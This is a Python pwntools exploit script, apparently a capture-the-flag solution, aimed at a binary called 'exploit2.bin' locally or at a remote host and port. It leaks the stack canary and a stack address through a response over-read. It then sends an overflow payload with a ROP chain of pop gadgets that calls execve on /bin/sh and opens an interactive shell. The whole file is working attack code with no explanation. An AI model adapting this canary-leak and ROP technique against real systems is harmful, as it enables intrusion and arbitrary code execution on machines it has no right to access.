#!/usr/bin/python3

from pwn import *

exe = ELF('exploit2.bin', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*0x0000000000401ed0

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('34.123.210.162', 20233)
else:
        p = process(exe.path)
pop_rax = 0x0000000000451fd7
pop_rdi = 0x00000000004018e2
pop_rsi = 0x000000000040f30e
pop_rdx = 0x00000000004017ef
pop_rbp = 0x0000000000401d41
GDB()
sl(f"{0x460}:/bin/sh\0.\0\0\0\0\0\0\0")
p.recvuntil(b'response...\n')
p.recv(0x358)
canary = u64(p.recv(8))
info("canary: " + hex(canary))
p.recv(0x430-0x358-0x8)

stack = u64(p.recv(8))
info("stack: " + hex(stack))
target = stack-0x548
info("target: " +hex(target))
payload = f'{0x460}:/bin/sh\0.\0\0\0\0\0\0\0"'.encode()
payload = payload.ljust(0x358+5+0xa8+0x8, b'a') + p64(canary)
payload += p64(0)
payload += flat(
        pop_rdi, target,
        pop_rsi, 0,
        pop_rax, 0x3b,
        pop_rbp, target,
        0x000000000041f5c4
)
sla(b'request...\n', payload)
sla(b'request...\n', '0:')
p.interactive()
